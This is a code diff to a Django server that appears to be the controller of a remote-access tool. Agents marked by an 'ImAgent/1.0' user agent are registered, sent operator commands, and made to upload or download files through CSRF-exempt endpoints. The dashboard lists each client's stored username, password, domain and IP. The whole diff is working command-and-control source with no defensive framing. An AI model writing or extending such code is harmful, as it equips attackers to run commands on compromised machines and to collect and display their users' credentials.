@@ -11,11 +11,15 @@ from .models import *
 from django.views.generic import View
 import re
 from .forms import UploadsForm
-import base64
+import json
 
 
-def name_generator(size=6, chars=string.ascii_uppercase + string.digits):
-    return ''.join(random.choice(chars) for _ in range(size))
+def name_extractor(request):
+    match = re.search(r"(\S+)\s+(?=ImAgent/1\.0)", request.META.get('HTTP_USER_AGENT'))
+    if match:
+        return match.group(1)
+    else:
+        return None
 
 
 def get_client_ip(request):
@@ -28,23 +32,17 @@ def get_client_ip(request):
     return ip
 
 
-def create_or_get_users(request):
-    clients = Clients.objects.all()
-    ip = get_client_ip(request)
-    user_agent = request.META.get('HTTP_USER_AGENT')
-
-    if 'ImAgent/1.0' in user_agent:
-        if not clients.filter(address=ip).exists():
-            Clients.objects.create(address=ip, name=name_generator())
-            clients = Clients.objects.all()
-
-    agent = clients.filter(address=ip).first()
-
+def create_or_get_users(request, id_name):
+    agent = Clients.objects.filter(id_name=id_name).first()
     if agent:
+        return agent
+    elif 'ImAgent/1.0' in request.META.get('HTTP_USER_AGENT'):
+        agent = Clients.objects.create(id_name=id_name, address=get_client_ip(request))
         agent.last_updated = now()
         agent.save()
-
-    return clients
+        return agent
+    else:
+        return None
 
 
 def get_chunk(request, file, index):
@@ -58,19 +56,37 @@ def get_chunk(request, file, index):
 
 class IndexView(View):
     def get(self, request):
-        clients = create_or_get_users(request)
+        clients = Clients.objects.all()
         form = UploadsForm()
+        client_list = {}
+
+        for client in clients:
+            client_list[client.id_name] = {
+                'id': client.id,
+                'id_name': client.id_name,
+                'username': client.username,
+                'password': client.password,
+                'domain': client.domain,
+                'ip': client.address,
+                'last_online_str': client.last_online_str(),
+                'last_online': client.last_online(),
+            }
+        json_data = json.dumps(client_list)
         context = {
-            'clients': clients,
+            'json_data': json_data,
             'form': form,
+            'clients': clients
         }
         return render(request, 'server_side/index.html', context)
 
     def post(self, request):
-        clients = create_or_get_users(request)
+        clients = Clients.objects.all()
         if self.request.POST.get('command'):
             client_name = self.request.POST.get('cmd_btn')
-            Commands.objects.create(receiver=clients.filter(name=client_name).first(),
+            print(client_name)
+            receiver = create_or_get_users(request, client_name)
+            print(receiver)
+            Commands.objects.create(receiver=receiver,
                                     command=self.request.POST.get('command'))
         if request.FILES:
             form = UploadsForm(request.POST, request.FILES)
@@ -89,9 +105,8 @@ class IndexView(View):
 @method_decorator(csrf_exempt, name='dispatch')
 class SendCommand(View):
     def get(self, request):
-        clients = create_or_get_users(request)
-        ip = get_client_ip(request)
-        agent = clients.filter(address=ip).first()
+        name = name_extractor(request)
+        agent = create_or_get_users(request, name)
 
         if not agent:
             return HttpResponse('Agent not found', status=400)
@@ -109,10 +124,9 @@ class SendCommand(View):
         return HttpResponse("No command available.", status=200)
 
     def post(self, request, *args, **kwargs):
-        clients = create_or_get_users(request)
+        name = name_extractor(request)
+        agent = create_or_get_users(request, name)
         body = request.body.decode('utf-8')
-        ip = get_client_ip(request)
-        agent = clients.filter(address=ip).first()
 
         if not agent:
             return HttpResponse("No client found for this IP.", status=401)
@@ -138,9 +152,8 @@ class SendCommand(View):
 @method_decorator(csrf_exempt, name='dispatch')
 class FileDownloadView(View):
     def get(self, request):
-        clients = create_or_get_users(request)
-        ip = get_client_ip(request)
-        agent = clients.filter(address=ip).first()
+        name = name_extractor(request)
+        agent = create_or_get_users(request, name)
         if agent:
             file = Uploads.objects.filter(client=agent).last()
             if file:
@@ -166,9 +179,8 @@ class FileDownloadView(View):
         if not match:
             return HttpResponse('Syntax Error. no ID sent :|', status=400)
         id = int(match.group(1))
-        clients = create_or_get_users(request)
-        ip = get_client_ip(request)
-        agent = clients.filter(address=ip).first()
+        name = name_extractor(request)
+        agent = create_or_get_users(request, name)
         if not agent:
             return HttpResponse("No client found for this IP.", status=401)
         hex_file = HexForDownload.objects.filter(id=id).last()
@@ -189,9 +201,8 @@ class FileUploadView(View):
         file_name = request.META.get('HTTP_FILENAME')
         if not file_name:
             return HttpResponse("Syntax Error. no filename sent :|", status=400)
-        clients = create_or_get_users(request)
-        ip = get_client_ip(request)
-        agent = clients.filter(address=ip).first()
+        name = name_extractor(request)
+        agent = create_or_get_users(request, name)
         if not agent:
             return HttpResponse("No client found for this IP.", status=401)
         id = request.META.get('HTTP_ID')
